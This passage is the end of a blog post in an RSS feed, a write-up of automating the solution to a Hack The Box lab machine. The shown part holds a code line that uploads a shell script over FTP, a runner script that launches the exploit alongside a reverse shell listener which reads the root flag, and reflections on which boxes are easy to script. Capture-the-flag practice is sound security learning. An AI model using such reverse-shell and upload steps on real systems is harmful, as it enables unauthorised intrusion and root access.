</span></span><span style="display:flex;"><span>    ftp_client<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;shell.sh&#34;</span>, <span style="color:#e6db74">&#34;/home/sau/shell.sh&#34;</span>)
</span></span></code></pre></div><p>The last step is to start a reverse shell listener and then read the root flag from within the reverse shell session. For this, I created a simple <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/revsh.py">socket client</a> which listens for a connection and then performs <code>cat /root/root.txt</code>.</p>
<p>I ran both the exploitation script and the socket client as two separate processes using a shell script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#! /bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>python auto_exploit.py &amp;
</span></span><span style="display:flex;"><span>python revsh.py
</span></span></code></pre></div><p>It might (should) be possible to run the exploitation part and socket listener as separate threads of the same process. I tried for a bit, but it didn‚Äôt work and I just chose the easy way out.</p>
<p>Running the runner script, I got both the user and root flags:</p>
<p><img src="/flags.webp" alt="Flags"></p>
<h2 id="closing-thoughts">Closing Thoughts</h2>
<p>This experiment was a lot of fun. After completing this box, I pondered over what makes a box scriptable. I think the correct answer is ‚Äî all boxes are scriptable if one is willing to persevere. The more practical questions what makes a box easy to script. I have come up with these criteria:</p>
<ul>
<li>Requires little to no UI interaction like clicking buttons, filing forms, etc that cannot be replicated using direct web / API calls. It might be possible to replicate these functionalities using selenium or similar ‚Äî but that increases the complexity of the script.</li>
<li>Related to the above ‚Äî requires performing operations using some software running on one of the open ports or the machine. These might be web UIs or even CLI programs installed in the box.</li>
<li>Does not have a lot of steps / does not require running a lot of tools. The time required to create the script will be directly proportionate to the number of steps.</li>
</ul>
<p>This was the first (and only) box I have tried to script. I have done a few other boxes after this one, but I did not spend time trying to script them because of one of the above reasons. As I complete more boxes, I will continue to assess if the box is easy to script. If yes, great! If not, it may have to do with one of the above reasons, or I might have some other new reasons.</p>
<p>That‚Äôs it from me. This is my 2023 contribution to my blog. I will not promise anything else here till a really long time has passed since this publication. I usually don‚Äôt work on technical things during my free time. Most (if not all) of the security work I do is by virtue of my employment. Therefore, there usually is not much for me to share.</p>
<p>Thanks for reading!</p>
]]></content>
        </item>
        
    </channel>
</rss>
